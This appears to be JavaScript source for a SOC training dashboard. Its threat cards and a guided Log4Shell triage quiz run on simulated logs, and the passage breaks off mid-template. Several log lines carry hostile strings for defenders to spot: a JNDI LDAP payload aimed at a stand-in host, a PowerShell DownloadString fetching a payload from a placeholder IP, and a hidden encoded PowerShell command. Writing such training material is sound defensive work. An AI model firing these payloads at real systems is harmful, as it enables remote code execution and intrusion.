// ==========================================================================
// LIVERANGE // PURE BLACK & SILVER FREEMIUM AESTHETIC ENGINE
// Exact replication of Image 2 typography, monochrome cards, and silver dock
// ==========================================================================

const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

// --- Threat Intelligence Dataset ---
const threats = [
  {
    id: 'CVE-2021-44228',
    name: 'Log4Shell',
    target: 'Apache Log4j Core 2.14.1',
    severity: 'Critical',
    score: '10.0',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    tech: 'T1190 Exploit Public-Facing App',
    techId: 'T1190',
    source: 'NVD / CISA KEV',
    actor: 'APT41, Lazarus Group, FIN7',
    desc: 'Unauthenticated remote code execution via recursive JNDI message lookup parsing in public HTTP headers.',
    time: '15 min',
    sampleLogs: [
      '09:41:02  [WAF-01]  [ALERT] [T1190] HTTP User-Agent pattern match: ${jndi:ldap://lookup.example.invalid/a}',
      '09:41:06  [EDR-03]  [WARN]  [T1059] Process java.exe (PID 4820) spawned outbound TCP to 198.51.100.42:389',
      '09:41:07  [HOST-03] [INFO]  host=web-app-03  library=log4j-core-2.14.1.jar  runtime=OpenJdk-11',
      '09:41:09  [DNS-01]  [QUERY] [T1071] web-app-03 sent A-record query for lookup.example.invalid -> 198.51.100.42',
      '09:41:13  [AUTH-01] [INFO]  backup-svc completed routine scheduled login on backup-01'
    ]
  },
  {
    id: 'CVE-2023-34362',
    name: 'MOVEit Transfer',
    target: 'MOVEit Web Service',
    severity: 'Critical',
    score: '9.8',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    tech: 'T1190 Exploit Public-Facing App',
    techId: 'T1190',
    source: 'CISA KEV',
    actor: 'CL0P Ransomware Syndicate (TA505)',
    desc: 'Pre-authentication SQL injection in MOVEit Transfer portal allowing unauthenticated session forgery and bulk data theft.',
    time: '20 min',
    sampleLogs: [
      '14:22:01  [EDGE]    [ALERT] SQL injection query token observed in X-Forwarded-For header',
      '14:22:04  [DB]      [WARN]  Guest session elevated to administrative database schema',
      '14:22:15  [DATA]    [ALERT] 1.4 GB compressed archive transferred via HTTPS POST to external IP'
    ]
  },
  {
    id: 'CVE-2021-26855',
    name: 'ProxyLogon',
    target: 'Microsoft Exchange Server',
    severity: 'Critical',
    score: '9.8',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    tech: 'T1505.003 Server Software Component',
    techId: 'T1505.003',
    source: 'NVD / CISA KEV',
    actor: 'HAFNIUM Group',
    desc: 'Pre-authentication SSRF vulnerability allowing arbitrary HTTP request forging and subsequent web shell persistence.',
    time: '20 min',
    sampleLogs: [
      '03:12:44  [EXCH]    [WARN]  Unauthenticated POST /ecp/y.js with Negotiate security token',
      '03:13:02  [FILE]    [ALERT] ASPX web shell written to C:\\inetpub\\wwwroot\\aspnet_client\\',
      '03:13:20  [PROC]    [WARN]  w3wp.exe spawned cmd.exe running whoami.exe'
    ]
  },
  {
    id: 'DEMO-T1059.001',
    name: 'Suspicious PowerShell',
    target: 'Windows 11 Enterprise Endpoint',
    severity: 'High',
    score: '8.4',
    cvss: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    tech: 'T1059.001 Command & Scripting Interpreter',
    techId: 'T1059.001',
    source: 'MITRE ATT&CK Mapping',
    actor: 'General Adversary TTP',
    desc: 'Base64-encoded obfuscated PowerShell execution with execution policy bypass flags, memory-resident AMSI patch, and scheduled task installation.',
    time: '15 min',
    sampleLogs: [
      '11:05:12  [PROC]    [WARN]  powershell.exe -NoP -NonI -W Hidden -Enc SUVYKE5ldy1PYmplY3... ',
      '11:05:14  [AMSI]    [ALERT] AmsiScanBuffer memory write detected from unbacked thread space'
    ]
  },
  {
    id: 'DEMO-T1078',
    name: 'Compromised Identity',
    target: 'Okta / Azure AD IdP',
    severity: 'High',
    score: '8.1',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N',
    tech: 'T1078 Valid Accounts',
    techId: 'T1078',
    source: 'MITRE ATT&CK Mapping',
    actor: 'Lapsus$, Midnight Blizzard',
    desc: 'Simultaneous geographical login anomaly: privileged user authenticated from Frankfurt and Tokyo within 8 minutes followed by MFA fatigue prompt spam.',
    time: '15 min',
    sampleLogs: [
      '16:40:02  [IDP]     [INFO]  User v.nair@corp authenticated from IP 194.26.29.112 (Frankfurt, DE)',
      '16:47:33  [IDP]     [ALERT] User v.nair@corp authenticated from IP 133.242.18.4 (Tokyo, JP)',
      '16:48:10  [MFA]     [WARN]  14 push notifications rejected by endpoint within 120 seconds'
    ]
  },
  {
    id: 'DEMO-T1041',
    name: 'Exfiltration Over C2',
    target: 'Enterprise Perimeter Gateway',
    severity: 'Medium',
    score: '7.5',
    cvss: 'CVSS:3.1/AV:N/AC:M/PR:L/UI:N/S:U/C:H/I:N/A:N',
    tech: 'T1041 Exfiltration Over C2 Channel',
    techId: 'T1041',
    source: 'MITRE ATT&CK Mapping',
    actor: 'FIN7, TA505',
    desc: 'Scheduled outbound bulk archive transfer encrypted with RC4 over non-standard TLS port matching known C2 beacon periodicity.',
    time: '15 min',
    sampleLogs: [
      '18:14:02  [NET]     [ALERT] Outbound HTTPS beacon to 203.0.113.88:8443 on 30s jitter loop',
      '18:14:35  [DLP]     [WARN]  Encrypted archive customer_db_export.7z transferred (850 MB)'
    ]
  }
];

const packs = ['CVE-2021-44228', 'CVE-2023-34362', 'CVE-2021-26855'];

// --- Interactive 3-Step Guided Investigation ---
const labStages = [
  {
    stage: 1,
    title: 'Step 1: Investigate (SIEM Log Correlation)',
    subtitle: 'Correlate perimeter alerts to identify the vulnerable host and the anomalous egress destination.',
    log: `09:41:02 [WAF-01]  [ALERT] [T1190] HTTP User-Agent pattern match: '\${jndi:ldap://lookup.example.invalid/a}' on ingress
09:41:06 [EDR-03]  [WARN]  [T1059] Process java.exe (PID 4820) initiated outbound TCP connection to 198.51.100.42:389
09:41:07 [HOST-03] [INFO]  host=web-app-03  library=log4j-core-2.14.1.jar  runtime=OpenJdk-11
09:41:09 [DNS-01]  [QUERY] [T1071] web-app-03 queried lookup.example.invalid -> 198.51.100.42
09:41:13 [AUTH-01] [INFO]  backup-svc routine maintenance login succeeded on backup-01`,
    options: [
      'web-app-03: Process java.exe executed JNDI lookup string with immediate egress to remote LDAP server (198.51.100.42:389).',
      'backup-01: Administrative scheduled backup routine execution represents unauthorized persistence.',
      'All cluster instances simultaneously compromised via zero-day kernel privilege escalation.'
    ],
    correct: 0,
    explanation: 'The SIEM correlation confirms web-app-03 ingested the ${jndi:ldap:...} payload and java.exe established outbound communication to the LDAP server on port 389.'
  },
  {
    stage: 2,
    title: 'Step 2: Classify (Payload Analysis & ATT&CK Mapping)',
    subtitle: 'Identify the exact MITRE ATT&CK technique utilized during this phase of the intrusion.',
    log: `09:42:15 [EDR-03]  [ALERT] [T1059.001] Child process spawned: java.exe -> powershell.exe -NoP -NonI -Enc SUVYKE5ld...
09:42:18 [HOST-03] [WARN]  [T1027] Decoded script content: DownloadString('http://198.51.100.42/payload.bin')
09:42:22 [NET-01]  [BLOCK] Outbound HTTPS download blocked by egress firewall policy rule #402`,
    options: [
      'T1078 (Valid Accounts) - Abuse of corporate Active Directory credentials.',
      'T1059.001 (PowerShell) spawned by public-facing application runtime under T1190.',
      'T1499 (Endpoint Denial of Service) - Network bandwidth saturation attack.'
    ],
    correct: 1,
    explanation: 'Log records clearly demonstrate java.exe spawning an obfuscated powershell.exe process (T1059.001) immediately following remote code execution via T1190.'
  },
  {
    stage: 3,
    title: 'Step 3: Respond (NIST SP 800-61 Containment Strategy)',
    subtitle: 'Select the optimal defensive mitigation according to NIST SP 800-61r2 standards.',
    log: `09:44:00 [SOC-DIR] [INFO]  Containment decision required for web-app-03 cluster.
09:44:02 [FW-EDGE] [INFO]  Egress rule active: LDAP (389) and RMI (1099) outbound drops enforced.
09:44:05 [K8S-01]  [INFO]  Container image tag: app-prod:2.14.1 (Vulnerable Log4j Core detected).`,
    options: [
      'Isolate web-app-03 network interface, upgrade Log4j to >=2.17.1 (or set LOG4J_FORMAT_MSG_NO_LOOKUPS=true), and audit endpoint memory for loaded web shells.',
      'Immediately format the disk drive of all host systems without capturing RAM or memory forensics.',
      'Leave host running normally and solely add an IP block on 198.51.100.42 at the firewall perimeter.'
    ],
    correct: 0,
    explanation: 'Standard SOC containment mandates network isolation, setting log4j format lookup bypass / patch upgrade, and preserving forensic evidence for post-incident root cause analysis.'
  }
];

// --- App State ---
let currentPage = 'overview'; // Default to Overview to match Image 2
let activeThreat = threats[0];
let activeStream = 'all';
let overviewFilter = 'all'; // all | attention | ready
let searchQuery = '';
let soundEnabled = localStorage.getItem('lr-sound') === 'true';

// Lab Range State
let activeLab = null;
let currentStage = 0;
let stageAnswers = [];
let labStartTime = 0;

// Local Storage Session History
let history = JSON.parse(localStorage.getItem('lr-history') || '[]');

// --- Tactical Audio Feedback ---
let audioCtx = null;
function playTone(freq, type = 'sine', duration = 0.08, vol = 0.04) {
  if (!soundEnabled) return;
  try {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.type = type;
    osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
    gain.gain.setValueAtTime(vol, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + duration);
  } catch (e) {}
}

const audio = {
  click: () => playTone(1200, 'sine', 0.03, 0.03),
  blip: () => playTone(780, 'triangle', 0.05, 0.03),
  alert: () => playTone(320, 'sawtooth', 0.14, 0.04),
  success: () => {
    playTone(980, 'sine', 0.08, 0.05);
    setTimeout(() => playTone(1480, 'sine', 0.12, 0.04), 70);
  }
};

function toggleSound() {
  soundEnabled = !soundEnabled;
  localStorage.setItem('lr-sound', soundEnabled);
  if (soundEnabled) {
    audio.success();
    showToast('Live light & feedback active');
  } else {
    showToast('Feedback muted');
  }
}

function showToast(msg) {
  const t = $('#inbox-toast');
  if (!t) return;
  $('#toast-text').textContent = msg;
  t.style.display = 'block';
  setTimeout(() => { t.style.display = 'none'; }, 3000);
}

function navigate(p) {
  audio.click();
  currentPage = p;
  location.hash = p;
  renderApp();
}

// ==========================================================================
// VOLUMETRIC SILVER RAYS CANVAS (HIGH VISIBILITY SILVER / PLATINUM)
// ==========================================================================
function initRaysCanvas() {
  const canvas = document.getElementById('rays-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let width = 0, height = 0, dpr = 1;
  let mouseX = 0, targetMouseX = 0;

  function resize() {
    dpr = Math.min(window.devicePixelRatio || 1, 2);
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width * dpr;
    canvas.height = height * dpr;
    ctx.scale(dpr, dpr);
  }
  window.addEventListener('resize', resize);
  resize();

  window.addEventListener('mousemove', e => {
    targetMouseX = (e.clientX / (width || 1) - 0.5) * 60;
  });

  // 16 High-Visibility Angled Volumetric Rays (Sharp Beams + Broad Platinum Sheens)
  const rayCount = 16;
  const rays = [];
  const rayAngle = -38 * (Math.PI / 180);

  for (let i = 0; i < rayCount; i++) {
    const isSharp = i % 3 === 0;
    rays.push({
      x: (i / rayCount) * (width * 2.4) - width * 0.7,
      width: isSharp ? 55 + Math.random() * 60 : 140 + Math.random() * 220,
      speed: 0.18 + Math.random() * 0.26,
      alpha: isSharp ? 0.32 + Math.random() * 0.20 : 0.18 + Math.random() * 0.18,
      phase: Math.random() * Math.PI * 2,
      freq: 0.007 + Math.random() * 0.012,
      // Pure Titanium Silver / Platinum RGB:
      r: Math.floor(225 + Math.random() * 25),
      g: Math.floor(235 + Math.random() * 20),
      b: Math.floor(250 + Math.random() * 5)
    });
  }

  let time = 0;
  function render() {
    time += 1;
    mouseX += (targetMouseX - mouseX) * 0.04;

    ctx.clearRect(0, 0, width, height);

    // Deep Obsidian Base
    ctx.fillStyle = '#06070a';
    ctx.fillRect(0, 0, width, height);

    // Bottom Bright Metallic Silver Horizon Pool (Directly behind bottom dock)
    const floorGlow = ctx.createRadialGradient(
      width * 0.52 + mouseX * 0.25, height * 0.98, 20,
      width * 0.52 + mouseX * 0.25, height * 0.98, height * 0.75
    );
    floorGlow.addColorStop(0, 'rgba(235, 245, 255, 0.40)');
    floorGlow.addColorStop(0.2, 'rgba(200, 225, 255, 0.28)');
    floorGlow.addColorStop(0.45, 'rgba(150, 180, 220, 0.15)');
    floorGlow.addColorStop(0.75, 'rgba(90, 115, 155, 0.06)');
    floorGlow.addColorStop(1, 'rgba(6, 7, 10, 0)');
    ctx.fillStyle = floorGlow;
    ctx.fillRect(0, 0, width, height);

    // Mid-upper soft ambient sheen pool
    const midGlow = ctx.createRadialGradient(
      width * 0.8 + mouseX * 0.2, height * 0.35, 40,
      width * 0.8 + mouseX * 0.2, height * 0.35, width * 0.55
    );
    midGlow.addColorStop(0, 'rgba(200, 225, 255, 0.14)');
    midGlow.addColorStop(1, 'rgba(6, 7, 10, 0)');
    ctx.fillStyle = midGlow;
    ctx.fillRect(0, 0, width, height);

    // Volumetric Drifting Angled Silver Rays (Screen Blending for Max Luminous Sheen)
    ctx.save();
    ctx.globalCompositeOperation = 'screen';
    ctx.translate(width * 0.5 + mouseX, height * 0.5);
    ctx.rotate(rayAngle);

    const diag = Math.sqrt(width * width + height * height) * 1.4;

    rays.forEach(ray => {
      ray.x += ray.speed;
      if (ray.x > diag) ray.x = -diag;

      const dynamicAlpha = ray.alpha * (1 + 0.32 * Math.sin(time * ray.freq + ray.phase));
      const grad = ctx.createLinearGradient(ray.x - ray.width / 2, 0, ray.x + ray.width / 2, 0);
      grad.addColorStop(0, `rgba(${ray.r}, ${ray.g}, ${ray.b}, 0)`);
      grad.addColorStop(0.22, `rgba(${ray.r}, ${ray.g}, ${ray.b}, ${dynamicAlpha * 0.48})`);
      grad.addColorStop(0.5, `rgba(255, 255, 255, ${Math.min(dynamicAlpha * 1.15, 1)})`);
      grad.addColorStop(0.78, `rgba(${ray.r}, ${ray.g}, ${ray.b}, ${dynamicAlpha * 0.48})`);
      grad.addColorStop(1, `rgba(${ray.r}, ${ray.g}, ${ray.b}, 0)`);

      ctx.fillStyle = grad;
      ctx.fillRect(ray.x - ray.width / 2, -diag, ray.width, diag * 2);
    });

    ctx.restore();

    requestAnimationFrame(render);
  }
  requestAnimationFrame(render);
}

// ==========================================================================
// 3D PERSPECTIVE TILT TRACKING
// ==========================================================================
function initPerspectiveTilt() {
  const panel = $('#main-panel-root');
  if (!panel) return;

  window.addEventListener('mousemove', e => {
    const x = e.clientX / window.innerWidth - 0.5;
    const y = e.clientY / window.innerHeight - 0.5;
    const rotateY = x * 1.2;
    const rotateX = -y * 1.2;
    panel.style.transform = `perspective(1400px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg)`;
  });

  window.addEventListener('mouseleave', () => {
    panel.style.transform = 'perspective(1400px) rotateX(0deg) rotateY(0deg)';
  });
}

// ==========================================================================
// VIEW 1: OVERVIEW (LIVERANGE CYBER READINESS // BLACK & SILVER FREEMIUM)
// Exact layout of Image 2, authentically mapped to LiveRange Report
// ==========================================================================
function viewOverview() {
  const dateStr = new Date().toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });

  const displayedThreats = threats.filter(t => {
    if (overviewFilter === 'attention') return t.severity === 'Critical';
    if (overviewFilter === 'ready') return packs.includes(t.id);
    return true;
  });

  return `
    <!-- Top Action Bar Matching Image 2 Geometry -->
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg>
        <span>Workspace</span>
        <span>/</span>
        <span class="active">Overview</span>
      </div>

      <div class="top-navbar-right">
        <div class="navbar-search-pill" id="nav-search-trigger">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
          <span>Search threats, CVEs...</span>
          <kbd>Ctrl K</kbd>
        </div>

        <button class="navbar-icon-btn" id="btn-theme-toggle" aria-label="Toggle theme / feedback" title="Toggle audio feedback">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line></svg>
        </button>

        <button class="navbar-icon-btn" id="btn-notifications" aria-label="Notifications" title="Threat feed status">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
        </button>

        <button class="navbar-icon-btn" id="btn-chat" aria-label="Pipeline Architecture" title="View 6-stage pipeline">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
        </button>

        <button class="navbar-icon-btn" id="btn-refresh-inbox" aria-label="Refresh Ingestion Feed" title="Refresh intelligence">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
        </button>
      </div>
    </div>

    <!-- Slim Banner Strip Matching Image 2 Geometry -->
    <div class="panel-banner-strip">
      <div style="display:flex;align-items:center;gap:8px">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3c0 4.5-2 6.5-6.5 6.5C10 9.5 12 11.5 12 16c0-4.5 2-6.5 6.5-6.5C14 9.5 12 7.5 12 3z"></path></svg>
        <span>Automated threat ingestion is active (NVD & CISA KEV feeds synced). Review prioritized disclosures & defensive exercises below.</span>
      </div>
      <a href="javascript:void(0)" data-page="threats">Review threat feed →</a>
    </div>

    <div style="padding:24px 28px;overflow-y:auto;flex:1">
      <!-- Page Header with Date Matching Image 2 -->
      <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:24px">
        <div>
          <span style="font-size:10px;font-weight:600;letter-spacing:0.08em;color:var(--text-muted);text-transform:uppercase;margin-bottom:4px;display:block">
            SOC TIER 2/3 OPERATIONS // READINESS MONITORING
          </span>
          <h1 style="font-size:28px;font-weight:600;letter-spacing:-0.02em;color:#fff;margin-bottom:4px">Overview</h1>
          <p style="font-size:13px;color:var(--text-secondary)">Real-time threat intelligence ingestion, scenario generation, and incident response readiness metrics.</p>
        </div>
        <div style="font-size:12.5px;color:var(--text-muted);font-weight:500">
          ${dateStr}
        </div>
      </div>

      <!-- 4-Metric Cards Row Matching Image 2 (Pure Black & Silver) -->
      <div class="overview-metrics-grid">
        <div class="overview-metric-card">
          <div class="card-title">Threats ingested</div>
          <div class="card-value">06</div>
          <div class="card-subtext">NVD & CISA KEV active feeds</div>
        </div>

        <div class="overview-metric-card">
          <div class="card-title">Reviewed scenario packs</div>
          <div class="card-value">03</div>
          <div class="card-subtext">Human-review gate approved</div>
        </div>

        <div class="overview-metric-card">
          <div class="card-title">Priority triage cases</div>
          <div class="card-value">01</div>
          <div class="card-subtext">Log4Shell (T1190) pending review</div>
        </div>

        <div class="overview-metric-card">
          <div class="card-title">Team readiness score</div>
          <div class="card-value">78%</div>
          <div class="card-subtext">+12 pts above MSSP baseline</div>
        </div>
      </div>

      <!-- Large Featured Card (Matching Image 2 "In Orbit" Glass Architecture) -->
      <div class="overview-featured-card">
        <div class="featured-card-top">
          <div>
            <div class="featured-eyebrow">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="4"></circle></svg>
              <span>CONTINUOUS THREAT-TO-TRAINING PIPELINE</span>
            </div>
            <h2>Every emerging threat has a verified defensive practice.</h2>
            <p>Transform live vulnerability disclosures into human-reviewed, MITRE ATT&CK-mapped defensive scenarios.</p>
          </div>

          <div class="featured-filter-pills">
            <button class="featured-pill-btn ${overviewFilter === 'all' ? 'active' : ''}" data-overview-filter="all">All threats</button>
            <button class="featured-pill-btn ${overviewFilter === 'attention' ? 'active' : ''}" data-overview-filter="attention">Critical CVEs</button>
            <button class="featured-pill-btn ${overviewFilter === 'ready' ? 'active' : ''}" data-overview-filter="ready">Reviewed labs</button>
          </div>
        </div>

        <!-- Ingested Priority Threats Table Inside the Card -->
        <table style="width:100%;border-collapse:collapse;font-size:12px;text-align:left">
          <thead>
            <tr style="border-bottom:1px solid var(--border-subtle);background:rgba(255,255,255,0.015)">
              <th style="padding:12px 24px;color:var(--text-muted);font-weight:500;font-size:11px">CVE IDENTIFIER</th>
              <th style="padding:12px 24px;color:var(--text-muted);font-weight:500;font-size:11px">TARGET TECHNOLOGY</th>
              <th style="padding:12px 24px;color:var(--text-muted);font-weight:500;font-size:11px">MITRE TECHNIQUE</th>
              <th style="padding:12px 24px;color:var(--text-muted);font-weight:500;font-size:11px">SEVERITY</th>
              <th style="padding:12px 24px;color:var(--text-muted);font-weight:500;font-size:11px">ACTION</th>
            </tr>
          </thead>
          <tbody>
            ${displayedThreats.map(t => `
              <tr style="border-bottom:1px solid var(--border-subtle)">
                <td style="padding:14px 24px;font-weight:600;color:#fff">${t.name} <span class="mono" style="color:var(--text-muted);font-weight:400;font-size:11px">(${t.id})</span></td>
                <td style="padding:14px 24px;color:var(--text-secondary)">${t.target}</td>
                <td style="padding:14px 24px" class="mono" style="color:var(--text-secondary)">${t.techId}</td>
                <td style="padding:14px 24px">
                  <span class="thread-badge-sev">${t.severity.toUpperCase()} ${t.score}</span>
                </td>
                <td style="padding:14px 24px">
                  <button class="navbar-btn-primary" style="padding:4px 12px;font-size:11px" data-launch="${t.id}">Triage Lab →</button>
                </td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>
  `;
}

// ==========================================================================
// VIEW 2: THREAT INTEL INBOX (3-COLUMN SPLIT // CONTINUOUS INGESTION)
// ==========================================================================
function viewThreatInbox() {
  const filtered = threats.filter(t => {
    let streamMatch = true;
    if (activeStream === 'kev') streamMatch = t.source.includes('CISA KEV');
    else if (activeStream === 'ttps') streamMatch = t.source.includes('MITRE');
    else if (activeStream === 'reviewed') streamMatch = packs.includes(t.id);

    const matchesSearch = (t.name + t.id + t.target + t.tech + t.actor).toLowerCase().includes(searchQuery.toLowerCase());
    return streamMatch && matchesSearch;
  });

  return `
    <div class="panel-top-navbar">
      <div class="panel-breadcrumbs">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg>
        <span>Workspace</span>
        <span>/</span>
        <span class="active">Threat Intelligence Inbox</span>
      </div>

      <div class="top-navbar-right">
        <div class="navbar-search-pill" id="nav-search-trigger">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
          <span>Search CVEs, ATT&CK...</span>
          <kbd>Ctrl K</kbd>
        </div>

        <button class="navbar-icon-btn" id="btn-theme-toggle" title="Toggle audio feedback">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line></svg>
        </button>

        <button class="navbar-btn-primary" data-launch="CVE-2021-44228">
          <span>Launch Lab →</span>
        </button>
      </div>
    </div>

    <div class="panel-page-header">
      <div class="page-header-left">
        <span class="eyebrow">DISCOVERY & INGESTION PIPELINE</span>
        <h1>Threat Intelligence Inbox</h1>
        <p>Live vulnerability feeds ingested from NVD and CISA KEV, correlated and mapped to MITRE ATT&CK techniques.</p>
      </div>

      <div class="page-header-right">
        <button class="icon-action-btn" id="btn-refresh-feed" title="Refresh intelligence feed">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
        </button>

        <button class="btn-compose-style" id="btn-sync-feeds">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
          <span>Sync Feeds</span>
        </button>
      </div>
    </div>

    <div class="inbox-split-workarea">
      <!-- Col 1: Threat Streams / Categories (185px) -->
      <div class="mailbox-filter-col">
        <div class="mailbox-col-header">INTEL STREAMS</div>
        
        <button class="mailbox-nav-btn ${activeStream === 'all' ? 'active' : ''}" data-stream="all">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"></polyline><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"></path></svg>
          <span>All Feeds</span>
          <span class="count-pill">6</span>
        </button>

        <button class="mailbox-nav-btn ${activeStream === 'kev' ? 'active' : ''}" data-stream="kev">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"></polyline><rect x="1" y="3" width="22" height="5"></rect><line x1="10" y1="12" x2="14" y2="12"></line></svg>
          <span>CISA KEV</span>
          <span class="count-pill">3</span>
        </button>

        <button class="mailbox-nav-btn ${activeStream === 'reviewed' ? 'active' : ''}" data-stream="reviewed">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
          <span>Reviewed Labs</span>
          <span class="count-pill">3</span>
        </button>

        <div class="mailbox-footer">
          <div>Feed health: Active (NVD / KEV)</div>
          <a href="javascript:void(0)" id="btn-sidebar-pipeline" style="color:var(--text-secondary);font-size:10.5px;display:inline-block;margin-top:3px">Pipeline Spec ↗</a>
        </div>
      </div>

      <!-- Col 2: Feed List (340px) -->
      <div class="conversations-feed-col">
        <div class="feed-search-header">
          <div class="feed-search-input-wrap">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            <input type="text" id="feed-search-input" placeholder="Search CVEs, ATT&CK, actors..." value="${searchQuery}">
          </div>

          <div class="feed-filter-bar">
            <button id="btn-filter-stream">
              <span>All Ingested</span>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>

            <button id="btn-sort-stream">
              <span>CVSS Severity</span>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
          </div>
        </div>

        <div class="conversations-scroll-list">
          ${filtered.length ? filtered.map(t => `
            <div class="conversation-thread-item ${activeThreat && activeThreat.id === t.id ? 'active' : ''}" data-select-threat="${t.id}">
              <div class="thread-item-top">
                <span class="thread-author">${t.name}</span>
                <span class="thread-time">${t.time}</span>
              </div>
              <div class="thread-subject">${t.id} · ${t.target}</div>
              <div class="thread-snippet">${t.desc}</div>
              <span class="thread-badge-sev">${t.severity.toUpperCase()} ${t.score}</span>
            </div>
          `).join('') : `
            <div class="empty-conversation-state" style="padding:48px 18px">
              <div class="empty-state-icon-wrap">
                <svg width="68" height="68" viewBox="0 0 68 68" fill="none">
                  <rect x="14" y="16" width="40" height="28" rx="4" stroke="rgba(255,255,255,0.18)" stroke-width="1.2" fill="rgba(255,255,255,0.02)"/>
                  <rect x="8" y="24" width="44" height="30" rx="4" stroke="rgba(255,255,255,0.3)" stroke-width="1.2" fill="rgba(15,22,35,0.7)"/>
                  <path d="M8 25L30 40L52 25" stroke="rgba(255,255,255,0.25)" stroke-width="1.2"/>
                  <circle cx="48" cy="46" r="10" fill="#0d1424" stroke="rgba(255,255,255,0.25)" stroke-width="1.2"/>
                  <rect x="43" y="42" width="10" height="8" rx="1.5" stroke="rgba(255,255,255,0.6)" stroke-width="1" fill="none"/>
                  <path d="M43 43L48 46.5L53 43" stroke="rgba(255,255,255,0.6)" stroke-width="0.9"/>
                </svg>
              </div>
              <h3>No threats matched</h3>
              <p>LiveRange continuous ingestion is scanning NVD, CISA KEV, and security advisories.</p>
            </div>
          `}
        </div>
      </div>

      <!-- Col 3: Detail / Reading Pane (Flex 1) -->
      <div class="reading-detail-pane">
        ${activeThreat ? `
          <div class="detail-thread-header">
            <div style="display:flex;justify-content:space-between;align-items:flex-start">
              <div>
